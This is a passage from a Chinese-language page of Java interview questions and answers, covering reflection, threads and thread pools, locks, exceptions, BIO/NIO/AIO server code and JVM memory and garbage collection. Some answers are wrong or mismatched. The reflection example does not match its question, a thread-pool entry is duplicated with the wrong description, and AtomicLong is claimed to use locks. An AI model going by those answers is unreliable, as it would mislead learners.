title="如何通过反射获取和设置对象私有字段的值？"></a>如何通过反射获取和设置对象私有字段的值？</h4><p>以通过类对象的getDeclaredField()方法字段（Field）对象，然后再通过字段对象的setAccessible(true)将其设置为可以访问，接下来就可以通过get/set方法来获取/设置字段的值了。</p><pre><code>import java.lang.reflect.Method;class MethodInvokeTest {    public static void main(String[] args) throws Exception {        String str = &quot;hello&quot;;    Method m = str.getClass().getMethod(&quot;toUpperCase&quot;);        System.out.println(m.invoke(str));  // HELLO    }}</code></pre><p>可以使用 ReflectionUtil 类简化反射方法。</p><h3 id="Java-多线程"><a href="#Java-多线程" class="headerlink" title="Java 多线程"></a>Java 多线程</h3><h4 id="如何保证线程安全？"><a href="#如何保证线程安全？" class="headerlink" title="如何保证线程安全？"></a>如何保证线程安全？</h4><p>通过合理的时间调度，避开共享资源的存取冲突。另外，在并行任务设计上可以通过适当的策略，保证任务与任务之间不存在共享资源，设计一个规则来保证一个客户的计算工作和数据访问只会被一个线程或一台工作机完成，而不是把一个客户的计算工作分配给多个线程去完成。</p><p>多数业务场景，避免使用全局对象，在方法内完成，可以避免线程安全问题。</p><h4 id="线程的基本状态以及状态之间的关系？"><a href="#线程的基本状态以及状态之间的关系？" class="headerlink" title="线程的基本状态以及状态之间的关系？"></a>线程的基本状态以及状态之间的关系？</h4><ul><li>Running表示运行状态</li><li>Runnable表示就绪状态（万事俱备，只欠CPU）</li><li>Blocked表示阻塞状态，阻塞状态又有多种情况，可能是因为调用wait()方法进入等待池，也可能是执行同步方法或同步代码块进入等锁池，或者是调用了sleep()方法或join()方法等待休眠或其他线程结束，或是因为发生了I/O中断。</li></ul><h4 id="什么是线程池（thread-pool）？"><a href="#什么是线程池（thread-pool）？" class="headerlink" title="什么是线程池（thread pool）？"></a>什么是线程池（thread pool）？</h4><p>在面向对象编程中，创建和销毁对象是很费时间的，因为创建一个对象要获取内存资源或者其它更多资源。在Java中更是如此，虚拟机将试图跟踪每一个对象，以便能够在对象销毁后进行垃圾回收。所以提高服务程序效率的一个手段就是尽可能减少创建和销毁对象的次数，特别是一些很耗资源的对象创建和销毁，这就是”池化资源”技术产生的原因。线程池顾名思义就是事先创建若干个可执行的线程放入一个池（容器）中，需要的时候从池中获取线程不用自行创建，使用完毕不需要销毁线程而是放回池中，从而减少创建和销毁线程对象的开销。<br>Java 5+中的Executor接口定义一个执行线程的工具。它的子类型即线程池接口是ExecutorService。要配置一个线程池是比较复杂的，尤其是对于线程池的原理不是很清楚的情况下，因此在工具类Executors面提供了一些静态工厂方法，生成一些常用的线程池，如下所示：</p><ul><li>newSingleThreadExecutor：创建一个单线程的线程池。这个线程池只有一个线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行。</li><li>newFixedThreadPool：创建固定大小的线程池。每次提交一个任务就创建一个线程，直到线程达到线程池的最大大小。线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程。</li><li>newCachedThreadPool：创建一个可缓存的线程池。如果线程池的大小超过了处理任务所需要的线程，那么就会回收部分空闲（60秒不执行任务）的线程，当任务数增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于操作系统（或者说JVM）能够创建的最大线程大小。</li><li>newScheduledThreadPool：创建一个大小无限的线程池。此线程池支持定时以及周期性执行任务的需求。</li><li>newSingleThreadExecutor：创建一个单线程的线程池。此线程池支持定时以及周期性执行任务的需求。</li></ul><h4 id="什么是同步和异步？"><a href="#什么是同步和异步？" class="headerlink" title="什么是同步和异步？"></a>什么是同步和异步？</h4><ul><li>如果系统中存在临界资源（资源数量少于竞争资源的线程数量的资源），例如正在写的数据以后可能被另一个线程读到，或者正在读的数据可能已经被另一个线程写过了，那么这些数据就必须进行同步存取（数据库操作中的排他锁就是最好的例子）。</li><li>当应用程序在对象上调用了一个需要花费很长时间来执行的方法，并且不希望让程序等待方法的返回时，就应该使用异步编程，在很多情况下采用异步途径往往更有效率。事实上，所谓的同步就是指阻塞式操作，而异步就是非阻塞式操作。</li></ul><h4 id="线程同步和线程调度的相关方法。"><a href="#线程同步和线程调度的相关方法。" class="headerlink" title="线程同步和线程调度的相关方法。"></a>线程同步和线程调度的相关方法。</h4><ul><li>wait()：使一个线程处于等待（阻塞）状态，并且释放所持有的对象的锁；</li><li>sleep()：使一个正在运行的线程处于睡眠状态，是一个静态方法，调用此方法要处理InterruptedException异常；</li><li>notify()：唤醒一个处于等待状态的线程，当然在调用此方法的时候，并不能确切的唤醒某一个等待状态的线程，而是由JVM确定唤醒哪个线程，而且与优先级无关；</li><li>notityAll()：唤醒所有处于等待状态的线程，该方法并不是将对象的锁给所有线程，而是让它们竞争，只有获得锁的线程才能进入就绪状态；<br>通过Lock接口提供了显式的锁机制（explicit lock），增强了灵活性以及对线程的协调。Lock接口中定义了加锁（lock()）和解锁（unlock()）的方法，同时还提供了newCondition()方法来产生用于线程之间通信的Condition对象；此外，Java 5还提供了信号量机制（semaphore），信号量可以用来限制对某个共享资源进行访问的线程的数量。在对资源进行访问之前，线程必须得到信号量的许可（调用Semaphore对象的acquire()方法）；在完成对资源的访问后，线程必须向信号量归还许可（调用Semaphore对象的release()方法）。</li></ul><h4 id="当一个线程进入一个对象的synchronized方法A之后，其它线程是否可进入此对象的synchronized方法B？"><a href="#当一个线程进入一个对象的synchronized方法A之后，其它线程是否可进入此对象的synchronized方法B？" class="headerlink" title="当一个线程进入一个对象的synchronized方法A之后，其它线程是否可进入此对象的synchronized方法B？"></a>当一个线程进入一个对象的synchronized方法A之后，其它线程是否可进入此对象的synchronized方法B？</h4><p>不能。其它线程只能访问该对象的非同步方法，同步方法则不能进入。因为非静态方法上的synchronized修饰符要求执行方法时要获得对象的锁，如果已经进入A方法说明对象锁已经被取走，那么试图进入B方法的线程就只能在等锁池（注意不是等待池哦）中等待对象的锁。</p><h4 id="线程的sleep-方法和yield-方法有什么区别？"><a href="#线程的sleep-方法和yield-方法有什么区别？" class="headerlink" title="线程的sleep()方法和yield()方法有什么区别？"></a>线程的sleep()方法和yield()方法有什么区别？</h4><ul><li>sleep()方法给其他线程运行机会时不考虑线程的优先级，因此会给低优先级的线程以运行的机会；yield()方法只会给相同优先级或更高优先级的线程以运行的机会；</li><li>线程执行sleep()方法后转入阻塞（blocked）状态，而执行yield()方法后转入就绪（ready）状态；</li><li>sleep()方法声明抛出InterruptedException，而yield()方法没有声明任何异常；</li><li>sleep()方法比yield()方法（跟操作系统CPU调度相关）具有更好的可移植性。</li></ul><h4 id="Java中有几种方法可以实现一个线程？"><a href="#Java中有几种方法可以实现一个线程？" class="headerlink" title="Java中有几种方法可以实现一个线程？"></a>Java中有几种方法可以实现一个线程？</h4><p>有两种实现方法，分别是继承Thread类与实现Runnable接口用</p><h4 id="用什么关键字修饰同步方法"><a href="#用什么关键字修饰同步方法" class="headerlink" title="用什么关键字修饰同步方法?"></a>用什么关键字修饰同步方法?</h4><p>synchronized关键字修饰同步方法。</p><h4 id="stop-和suspend-方法为何不推荐使用，请说明原因？"><a href="#stop-和suspend-方法为何不推荐使用，请说明原因？" class="headerlink" title="stop()和suspend()方法为何不推荐使用，请说明原因？"></a>stop()和suspend()方法为何不推荐使用，请说明原因？</h4><p>反对使用stop()，是因为它不安全。它会解除由线程获取的所有锁定，而且如果对象处于一种不连贯状态，那么其他线程能在那种状态下检查和修改它们。结果很难检查出真正的问题所在。suspend()方法容易发生死锁。调用suspend()的时候，目标线程会停下来，但却仍然持有在这之前获得的锁定。此时，其他任何线程都不能访问锁定的资源，除非被”挂起”的线程恢复运行。对任何线程来说，如果它们想恢复目标线程，同时又试图使用任何一个锁定的资源，就会造成死锁。所以不应该使用suspend()，而应在自己的Thread类中置入一个标志，指出线程应该活动还是挂起。若标志指出线程应该挂起，便用 wait()命其进入等待状态。若标志指出线程应当恢复，则用一个notify()重新启动线程。</p><h4 id="启动一个线程是用run-还是start"><a href="#启动一个线程是用run-还是start" class="headerlink" title="启动一个线程是用run()还是start()?"></a>启动一个线程是用run()还是start()?</h4><p>启动一个线程是调用start()方法，使线程所代表的虚拟处理机处于可运行状态，这意味着它可以由JVM调度并执行。这并不意味着线程就会立即运行。run()方法可以产生必须退出的标志来停止一个线程。</p><h4 id="线程中的同步和异步有何异同？并且请举例说明在什么情况下会使用到同步和异步？"><a href="#线程中的同步和异步有何异同？并且请举例说明在什么情况下会使用到同步和异步？" class="headerlink" title="线程中的同步和异步有何异同？并且请举例说明在什么情况下会使用到同步和异步？"></a>线程中的同步和异步有何异同？并且请举例说明在什么情况下会使用到同步和异步？</h4><ul><li>如果数据将在线程间共享。例如正在写的数据以后可能被另一个线程读到，或者正在读的数据可能已经被另一个线程写过了，那么这些数据就是共享数据，必须进行同步存取。</li><li>当应用程序在对象上调用了一个需要花费很长时间来执行的方法，并且不希望让程序等待方法的返回时，就应该使用异步编程，在很多情况下采用异步途径往往更有效率。</li></ul><h4 id="创建线程有几种不同的方式？你喜欢哪一种？为什么？"><a href="#创建线程有几种不同的方式？你喜欢哪一种？为什么？" class="headerlink" title="创建线程有几种不同的方式？你喜欢哪一种？为什么？"></a>创建线程有几种不同的方式？你喜欢哪一种？为什么？</h4><p>有三种方式可以用来创建线程：</p><ul><li>继承Thread类</li><li>实现Runnable接口</li><li>应用程序可以使用Executor框架来创建线程池<br>实<br>现Runnable接口这种方式更受欢迎，因为这不需要继承Thread类。在应用设计中已经继承了别的对象的情况下，这需要多继承（而Java不支持多继承），只能实现接口。同时，线程池也是非常高效的，很容易实现和使用。</li></ul><h4 id="JAVA中cyclicbarrier和countdownlatch的区别分别是什么？"><a href="#JAVA中cyclicbarrier和countdownlatch的区别分别是什么？" class="headerlink" title="JAVA中cyclicbarrier和countdownlatch的区别分别是什么？"></a>JAVA中cyclicbarrier和countdownlatch的区别分别是什么？</h4><p>CountDownLatch和CyclicBarrier都能够实现线程之间的等待，只不过它们侧重点不同：</p><ul><li><p>CountDownLatch 一般用于某个线程A等待若干个其他线程执行完任务之后，它才执行；</p></li><li><p>而 CyclicBarrier 一般用于一组线程互相等待至某个状态，然后这一组线程再同时执行；</p></li></ul><p>另外，CountDownLatch是不能够重用的，而CyclicBarrier是可以重用的。</p><h4 id="线程池有什么优势？"><a href="#线程池有什么优势？" class="headerlink" title="线程池有什么优势？"></a>线程池有什么优势？</h4><ul><li><p>降低资源消耗。通过重复利用已创建的线程降低线程创建和销毁造成的消耗。</p></li><li><p>提高响应速度。当任务到达时，任务可以不需要等到线程创建就能执行。</p></li><li><p>提高线程的可管理性，线程是稀缺资源，如果无限制地创建，不仅会消耗系统资源，还会降低系统的稳定性，使用线程池可以进行统一分配、调优和监控。</p></li></ul><h4 id="你对AQS的理解。"><a href="#你对AQS的理解。" class="headerlink" title="你对AQS的理解。"></a>你对AQS的理解。</h4><p>AQS其实就是一个可以给我们实现锁的框架<br>内部实现的关键是：</p><ul><li>先进先出的队列、state状态</li><li>定义了内部类ConditionObject</li><li>拥有两种线程模式独占模式和共享模式。</li><li>在LOCK包中的相关锁(常用的有ReentrantLock、 ReadWriteLock)都是基于AQS来构建，一般我们叫AQS为同步器。</li></ul><h4 id="线程池的运行流程，使用参数以及方法策略等"><a href="#线程池的运行流程，使用参数以及方法策略等" class="headerlink" title="线程池的运行流程，使用参数以及方法策略等"></a>线程池的运行流程，使用参数以及方法策略等</h4><p>线程池主要就是指定线程池核心线程数大小，最大线程数，存储的队列，拒绝策略，空闲线程存活时长。当需要任务大于核心线程数时候，就开始把任务往存储任务的队列里，当存储队列满了的话，就开始增加线程池创建的线程数量，如果当线程数量也达到了最大，就开始执行拒绝策略，比如说记录日志，直接丢弃，或者丢弃最老的任务。</p><h4 id="如何在线程安全的情况下实现一个计数器？"><a href="#如何在线程安全的情况下实现一个计数器？" class="headerlink" title="如何在线程安全的情况下实现一个计数器？"></a>如何在线程安全的情况下实现一个计数器？</h4><p>可以使用加锁，比如synchronized或者lock。也可以使用Concurrent包下的原子类。</p><p>推荐使用原子类。</p><h4 id="多线程中的i-线程安全吗？请简述一下原因？"><a href="#多线程中的i-线程安全吗？请简述一下原因？" class="headerlink" title="多线程中的i++线程安全吗？请简述一下原因？"></a>多线程中的i++线程安全吗？请简述一下原因？</h4><p>不安全。i++不是原子性操作。i++分为读取i值，对i值加一，再赋值给i++，执行期中任何一步都是有可能被其他线程抢占的。</p><h4 id="什么是死锁-deadlock"><a href="#什么是死锁-deadlock" class="headerlink" title="什么是死锁(deadlock)?"></a>什么是死锁(deadlock)?</h4><p>两个线程或两个以上线程都在等待对方执行完毕才能继续往下执行的时候就发生了死锁。结果就是这些线程都陷入了无限的等待中。</p><p>例如，如果线程1锁住了A，然后尝试对B进行加锁，同时线程2已经锁住了B，接着尝试对A进行加锁，这时死锁就发生了。线程1永远得不到B，线程2也永远得不到A，并且它们永远也不会知道发生了这样的事情。为了得到彼此的对象（A和B），它们将永远阻塞下去。这种情况就是一个死锁。</p><p>死锁的四个必要条件：</p><ul><li>互斥条件：一个资源每次只能被一个进程使用，即在一段时间内某 资源仅为一个进程所占有。此时若有其他进程请求该资源，则请求进程只能等待。</li><li>请求与保持条件：进程已经保持了至少一个资源，但又提出了新的资源请求，而该资源 已被其他进程占有，此时请求进程被阻塞，但对自己已获得的资源保持不放。</li><li>不可剥夺条件:进程所获得的资源在未使用完毕之前，不能被其他进程强行夺走，即只能 由获得该资源的进程自己来释放（只能是主动释放)。</li><li>循环等待条件: 若干进程间形成首尾相接循环等待资源的关系</li></ul><p>这四个条件是死锁的必要条件，只要系统发生死锁，这些条件必然成立，而只要上述条件之一不满足，就不会发生死锁。</p><h4 id="synchronized-可重入吗？怎么实现的？"><a href="#synchronized-可重入吗？怎么实现的？" class="headerlink" title="synchronized 可重入吗？怎么实现的？"></a>synchronized 可重入吗？怎么实现的？</h4><p>可重入。每个锁关联一个线程持有者和一个计数器。当计数器为0时表示该锁没有被任何线程持有，那么任何线程都都可能获得该锁而调用相应方法。当一个线程请求成功后，JVM会记下持有锁的线程，并将计数器计为1。此时其他线程请求该锁，则必须等待。而该持有锁的线程如果再次请求这个锁，就可以再次拿到这个锁，同时计数器会递增。当线程退出一个synchronized方法/块时，计数器会递减，如果计数器为0则释放该锁。</p><h4 id="非公平锁和公平锁在-reetrantlock-里的实现过程是怎样的。"><a href="#非公平锁和公平锁在-reetrantlock-里的实现过程是怎样的。" class="headerlink" title="非公平锁和公平锁在 reetrantlock 里的实现过程是怎样的。"></a>非公平锁和公平锁在 reetrantlock 里的实现过程是怎样的。</h4><p>如果一个锁是公平的，那么锁的获取顺序就应该符合请求的绝对时间顺序，FIFO。对于非公平锁，只要CAS设置同步状态成功，则表示当前线程获取了锁，而公平锁还需要判断当前节点是否有前驱节点，如果有，则表示有线程比当前线程更早请求获取锁，因此需要等待前驱线程获取并释放锁之后才能继续获取锁。</p><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><h4 id="Java-中异常的种类有哪些？"><a href="#Java-中异常的种类有哪些？" class="headerlink" title="Java 中异常的种类有哪些？"></a>Java 中异常的种类有哪些？</h4><p><img src="/interview/interview/java-server-enginer-interview/exception.jpg" alt="img" style="zoom:67%;"></p><h4 id="运行时异常与受检异常有什么区别？"><a href="#运行时异常与受检异常有什么区别？" class="headerlink" title="运行时异常与受检异常有什么区别？"></a>运行时异常与受检异常有什么区别？</h4><p>异常表示程序运行过程中可能出现的非正常状态，运行时异常表示虚拟机的通常操作中可能遇到的异常，是一种常见运行错误，只要程序设计得没有问题通常就不会发生。受检异常跟程序运行的上下文环境有关，即使程序设计无误，仍然可能因使用的问题而引发。Java编译器要求方法必须声明抛出可能发生的受检异常，但是并不要求必须声明抛出未被捕获的运行时异常。异常和继承一样，是面向对象程序设计中经常被滥用的东西，在Effective Java中对异常的使用给出了以下指导原则：</p><ul><li>不要将异常处理用于正常的控制流（设计良好的API不应该强迫它的调用者为了正常的控制流而使用异常）</li><li>对可以恢复的情况使用受检异常，对编程错误使用运行时异常</li><li>避免不必要的使用受检异常（可以通过一些状态检测手段来避免异常的发生）</li><li>优先使用标准的异常</li><li>每个方法抛出的异常都要有文档</li><li>保持异常的原子性</li><li>不要在catch中忽略掉捕获到的异常</li></ul><h4 id="请说明一下Java中的异常处理机制的原理以及如何应用。"><a href="#请说明一下Java中的异常处理机制的原理以及如何应用。" class="headerlink" title="请说明一下Java中的异常处理机制的原理以及如何应用。"></a>请说明一下Java中的异常处理机制的原理以及如何应用。</h4><p>当JAVA 程序违反了JAVA的语义规则时，JAVA虚拟机就会将发生的错误表示为一个异常。违反语义规则包括2种情况。一种是JAVA类库内置的语义检查。例如数组下标越界,会引发IndexOutOfBoundsException;访问null的对象时会引发NullPointerException。另一种情况就是JAVA允许程序员扩展这种语义检查，程序员可以创建自己的异常，并自由选择在何时用throw关键字引发异常。所有的异常都是 java.lang.Thowable的子类。</p><h4 id="请问你平时最常见到的runtime-exception是什么？"><a href="#请问你平时最常见到的runtime-exception是什么？" class="headerlink" title="请问你平时最常见到的runtime exception是什么？"></a>请问你平时最常见到的runtime exception是什么？</h4><ul><li>IndexOutOfBoundsException,</li><li>MissingResourceException,</li><li>NegativeArraySizeException,</li><li>NoSuchElementException,</li><li>NullPointerException,</li></ul><h4 id="error和exception有什么区别"><a href="#error和exception有什么区别" class="headerlink" title="error和exception有什么区别?"></a>error和exception有什么区别?</h4><ul><li>error 表示恢复不是不可能但很困难的情况下的一种严重问题。比如说内存溢出。不可能指望程序能处理这样的情况。</li><li>exception 表示一种设计或实现问题。也就是说，它表示如果程序运行正常，从不会发生的情况。</li></ul><h4 id="运行时的异常与一般情况下出现的异常有什么相同点和不同点？"><a href="#运行时的异常与一般情况下出现的异常有什么相同点和不同点？" class="headerlink" title="运行时的异常与一般情况下出现的异常有什么相同点和不同点？"></a>运行时的异常与一般情况下出现的异常有什么相同点和不同点？</h4><p>异常表示程序运行过程中可能出现的非正常状态，运行时异常表示虚拟机的通常操作中可能遇到的异常，是一种常见运行错误。java编译器要求方法必须声明抛出可能发生的非运行时异常，但是并不要求必须声明抛出未被捕获的运行时异常。</p><h3 id="IO-模型"><a href="#IO-模型" class="headerlink" title="IO 模型"></a>IO 模型</h3><h4 id="IO-模型参考资料"><a href="#IO-模型参考资料" class="headerlink" title="IO 模型参考资料"></a>IO 模型参考资料</h4><p><a href="https://zhuanlan.zhihu.com/p/103493558" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/103493558</a></p><h4 id="BIO、-NIO、AIO-的区别是什么？"><a href="#BIO、-NIO、AIO-的区别是什么？" class="headerlink" title="BIO、 NIO、AIO 的区别是什么？"></a>BIO、 NIO、AIO 的区别是什么？</h4><ul><li>BIO Blocking IO（同步阻塞 IO）可以用 Socket socket = serverSocket.accept(); </li><li>Non-Blocking IO（同步非阻塞 IO）可以使用 NIO 相关的类，并开启 serverSocketChannel.configureBlocking(false) 代码会变得复杂，使用的是操作系统 epoll 技术。netty 使用的是 NIO</li><li>Async Non-Blocking IO（异步非阻塞 IO）Java 1.7 时代推出了异步非阻塞的 IO 模型</li></ul><h4 id="使用-BIO-编写服务器的方法是什么？"><a href="#使用-BIO-编写服务器的方法是什么？" class="headerlink" title="使用 BIO 编写服务器的方法是什么？"></a>使用 BIO 编写服务器的方法是什么？</h4><pre><code class="java">try (ServerSocket serverSocket = new ServerSocket(8888)) {  while (true) {    Socket socket = serverSocket.accept();    // 提交到线程池处理后续的任务    executorService.submit(new ProcessRequest(socket));  }} catch (Exception e) {  e.printStackTrace();}</code></pre><h4 id="使用-NIO-编写服务器方法是什么？"><a href="#使用-NIO-编写服务器方法是什么？" class="headerlink" title="使用 NIO 编写服务器方法是什么？"></a>使用 NIO 编写服务器方法是什么？</h4><pre><code class="java">try {  ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();  serverSocketChannel.bind(new InetSocketAddress(&quot;127.0.0.1&quot;, 8888));  while (true) {    SocketChannel socketChannel = serverSocketChannel.accept();    executorService.execute(new ProcessChannel(socketChannel));  }} catch (Exception e) {  e.printStackTrace();}</code></pre><h4 id="使用-AIO-编写服务器的方法是什么？"><a href="#使用-AIO-编写服务器的方法是什么？" class="headerlink" title="使用 AIO 编写服务器的方法是什么？"></a>使用 AIO 编写服务器的方法是什么？</h4><pre><code class="java">AsynchronousServerSocketChannel serverChannel = AsynchronousServerSocketChannel                .open()                .bind(new InetSocketAddress(8888));serverChannel.accept(serverChannel, new CompletionHandler&lt;AsynchronousSocketChannel, AsynchronousServerSocketChannel&gt;() {  @Override  public void completed(AsynchronousSocketChannel result, AsynchronousServerSocketChannel attachment) {    serverChannel.accept(serverChannel, this);    ByteBuffer buffer = ByteBuffer.allocate(1024);    /**连接客户端成功后注册 read 事件**/    result.read(buffer, buffer, new CompletionHandler&lt;Integer, ByteBuffer&gt;() {      @Override      public void completed(Integer result, ByteBuffer attachment) {        /**IO 可读事件出现的时候，读取客户端发送过来的内容**/        attachment.flip();        System.out.println(Charset.forName(&quot;utf-8&quot;).decode(attachment));      }            /**省略无关紧要的方法**/    });  }  /**省略无关紧要的方法**/});</code></pre><h4 id="Netty-是基于那种-IO-模型？"><a href="#Netty-是基于那种-IO-模型？" class="headerlink" title="Netty 是基于那种 IO 模型？"></a>Netty 是基于那种 IO 模型？</h4><p>Netty 基于 NIO 但是一个异步非阻塞的 IO 模型。</p><h3 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h3><p>JVM 内存可以看相关材料：</p><p><a href="https://blog.csdn.net/l1394049664/article/details/81486470" target="_blank" rel="noopener">https://blog.csdn.net/l1394049664/article/details/81486470</a></p><h4 id="JDK和JRE的区别是什么？"><a href="#JDK和JRE的区别是什么？" class="headerlink" title="JDK和JRE的区别是什么？"></a>JDK和JRE的区别是什么？</h4><p>Java运行时环境(JRE)是将要执行Java程序的Java虚拟机。它同时也包含了执行applet需要的浏览器插件。Java开发工具包(JDK)是完整的Java软件开发包，包含了JRE，编译器和其他的工具(比如：JavaDoc，Java调试器)，可以让开发者开发、编译、执行Java应用程序。</p><h4 id="LongAdder和-AtomicLong-有什么区别？"><a href="#LongAdder和-AtomicLong-有什么区别？" class="headerlink" title="LongAdder和 AtomicLong 有什么区别？"></a>LongAdder和 AtomicLong 有什么区别？</h4><p>JDK1.8引入了LongAdder类。CAS机制就是，在一个死循环内，不断尝试修改目标值，直到修改成功。如果竞争不激烈，那么修改成功的概率就很高，否则，修改失败的的概率就很高，在大量修改失败时，这些原子操作就会进行多次循环尝试，因此性能就会受到影响。 结合ConcurrentHashMap的实现思想，应该可以想到对一种传统AtomicInteger等原子类的改进思路。虽然CAS操作没有锁，但是像减少粒度这种分离热点的思想依然可以使用。将AtomicInteger的内部核心数据value分离成一个数组，每个线程访问时，通过哈希等算法映射到其中一个数字进行计数，而最终的计数结果，则为这个数组的求和累加。热点数据value被分离成多个单元cell，每个cell独自维护内部的值，当前对象的实际值由所有的cell累计合成，这样热点就进行了有效的分离，提高了并行度。</p><p>LongAdder 是通过 CAS 实现的，AtomicLong 通过锁实现的。</p><h4 id="AVA中反射的实现过程和作用分别是什么？"><a href="#AVA中反射的实现过程和作用分别是什么？" class="headerlink" title="AVA中反射的实现过程和作用分别是什么？"></a>AVA中反射的实现过程和作用分别是什么？</h4><p>JAVA语言编译之后会生成一个.class文件，反射就是通过字节码文件找到某一个类、类中的方法以及属性等。反射的实现主要借助以下四个类：Class：类的对象，Constructor：类的构造方法，Field：类中的属性对象，Method：类中的方法对象。</p><p>作用：反射机制指的是程序在运行时能够获取自身的信息。在JAVA中，只要给定类的名字，那么就可以通过反射机制来获取类的所有信息。</p><h4 id="JVM加载class文件的原理是什么"><a href="#JVM加载class文件的原理是什么" class="headerlink" title="JVM加载class文件的原理是什么?"></a>JVM加载class文件的原理是什么?</h4><p>JVM中类的装载是由ClassLoader和它的子类来实现的,Java ClassLoader 是一个重要的Java运行时系统组件。它负责在运行时查找和装入类文件的类。</p><p>Java中的所有类，都需要由类加载器装载到JVM中才能运行。类加载器本身也是一个类，而它的工作就是把class文件从硬盘读取到内存中。在写程序的时候，我们几乎不需要关心类的加载，因为这些都是隐式装载的，除非我们有特殊的用法，像是反射，就需要显式的加载所需要的类。</p><p>类装载方式，有两种</p><ol><li>隐式装载，程序在运行过程中当碰到通过new 等方式生成对象时，隐式调用类装载器加载对应的类到jvm中，</li><li>显式装载，通过class.forname()等方法，显式加载需要的类 ,隐式加载与显式加载的区别：两者本质是一样的。</li></ol><p>Java类的加载是动态的，它并不会一次性将所有类全部加载后再运行，而是保证程序运行的基础类(像是基类)完全加载到jvm中，至于其他类，则在需要的时候才加载。这当然就是为了节省内存开销。</p><h4 id="jvm最大内存限制多少？"><a href="#jvm最大内存限制多少？" class="headerlink" title="jvm最大内存限制多少？"></a>jvm最大内存限制多少？</h4><ol><li>堆内存分配</li></ol><p>JVM初始分配的内存由-Xms指定，默认是物理内存的1/64；JVM最大分配的内存由-Xmx指定，默认是物理内存的1/4。默认空余堆内存小 于40%时，JVM就会增大堆直到-Xmx的最大限制；空余堆内存大于70%时，JVM会减少堆直到-Xms的最小限制。因此服务器一般设置-Xms、 -Xmx相等以避免在每次GC后调整堆的大小。</p><ol start="2"><li>非堆内存分配</li></ol><p>JVM使用-XX:PermSize设置非堆内存初始值，默认是物理内存的1/64；由XX:MaxPermSize设置最大非堆内存的大小，默认是物理内存的1/4。</p><ol start="3"><li>VM最大内存</li></ol><p>首先JVM内存限制于实际的最大物理内存，假设物理内存无限大的话，JVM内存的最大值跟操作系统有很大的关系。简单的说就32位处理器虽 然可控内存空间有4GB,但是具体的操作系统会给一个限制，这个限制一般是2GB-3GB（一般来说Windows系统下为1.5G-2G，Linux系 统下为2G-3G），而64bit以上的处理器就不会有限制了。</p><h4 id="jvm是如何实现线程的？"><a href="#jvm是如何实现线程的？" class="headerlink" title="jvm是如何实现线程的？"></a>jvm是如何实现线程的？</h4><p>线程是比进程更轻量级的调度执行单位。线程可以把一个进程的资源分配和执行调度分开。一个进程里可以启动多条线程，各个线程可共享该进程的资源(内存地址，文件IO等)，又可以独立调度。线程是 CPU 调度的基本单位。</p><p>主流 OS 都提供线程实现。Java语言提供对线程操作的同一API，每个已经执行start()，且还未结束的 java.lang.Thread 类的实例，代表了一个线程。</p><p>Thread 类的关键方法，都声明为 Native。这意味着这个方法无法或没有使用平台无关的手段来实现，也可能是为了执行效率。</p><p>实现线程的方式</p><ol><li>使用内核线程实现内核线程(Kernel-Level Thread, KLT)就是直接由操作系统内核支持的线程。内核通过调度器Scheduler调度线程，并将线程的任务映射到各个CPU上程序使用内核线程的高级接口，轻量级进程(Light Weight Process,LWP)。1.2 版本后使用操作系统层面的线程实现。</li><li>使用用户线程实现，系统内核不能感知线程存在的实现，用户线程的建立、同步、销毁和调度完全在用户态中完成，所有线程操作需要用户程序自己处理，复杂度高</li><li>用户线程加轻量级进程混合实现，轻量级进程作为用户线程和内核线程之间的桥梁</li></ol><h4 id="在JAVA虚拟机中，哪些对象可作为ROOT对象？"><a href="#在JAVA虚拟机中，哪些对象可作为ROOT对象？" class="headerlink" title="在JAVA虚拟机中，哪些对象可作为ROOT对象？"></a>在JAVA虚拟机中，哪些对象可作为ROOT对象？</h4><ul><li>虚拟机栈中的引用对象</li><li>方法区中类静态属性引用的对象</li><li>方法区中常量引用对象</li><li>本地方法栈中JNI引用对象</li></ul><h4 id="GC中如何判断对象是否需要被回收？"><a href="#GC中如何判断对象是否需要被回收？" class="headerlink" title="GC中如何判断对象是否需要被回收？"></a>GC中如何判断对象是否需要被回收？</h4><p>即使在可达性分析算法中不可达的对象,也并非是“非回收不可”的,这时候它们暂时处于“等待”阶段,要真正宣告一个对象回收,至少要经历两次标记过程:如果对象在进行可达性分析后发现没有与GC Roots相连接的引用链,那它将会被第一次标记并且进行一次筛选,筛选的条件是此对象是否有必要执行finalize()方法。当对象没有覆盖finalize()方法,或者finalize()方法已经被虚拟机调用过,虚拟机将这两种情况都视为“没有必要执行”。(即意味着直接回收)</p><p>如果这个对象被判定为有必要执行finalize()方法,那么这个对象将会放置在一个叫做F-Queue的队列之中,并在稍后由一个由虚拟机自动建立的、低优先级的Finalizer线程去执行它。这里所谓的“执行”是指虚拟机会触发这个方法,但并不承诺会等待它运行结束,这样做的原因是,如果一个对象在finalize()方法中执行缓慢,或者发生了死循环(更极端的情况),将很可能会导致F-Queue队列中其他对象永久处于等待,甚至导致整个内存回收系统崩溃。</p><p>finalize()方法是对象逃脱回收的最后一次机会,稍后GC将对F-Queue中的对象进行第二次小规模的标记,如果对象要在finalize()中跳出回收——只要重新与引用链上的任何一个对象建立关联即可,譬如把自己(this关键字)赋值给某个类变量或者对象的成员变量,那在第二次标记时它将被移除出“即将回收”的集合;如果对象这时候还没有逃脱,那基本上它就真的被回收了。</p><h4 id="eden区和survial区的含义以及工作原理？"><a href="#eden区和survial区的含义以及工作原理？" class="headerlink" title="eden区和survial区的含义以及工作原理？"></a>eden区和survial区的含义以及工作原理？</h4><p>目前主流的虚拟机实现都采用了分代收集的思想，把整个堆区划分为新生代和老年代；新生代又被划分成Eden 空间、 From Survivor 和 To Survivor 三块区域。</p><p>我们把Eden : From Survivor : To Survivor 空间大小设成 8 : 1 : 1 ，对象总是在 Eden 区出生， From Survivor 保存当前的幸存对象， To Survivor 为空。一次 gc 发生后： 1）Eden 区活着的对象 ＋ From Survivor 存储的对象被复制到 To Survivor ；<br>2) 清空 Eden 和 From Survivor ； 3) 颠倒 From Survivor 和 To Survivor 的逻辑关系： From 变 To ， To 变 From 。可以看出，只有在 Eden 空间快满的时候才会触发 Minor GC 。而 Eden 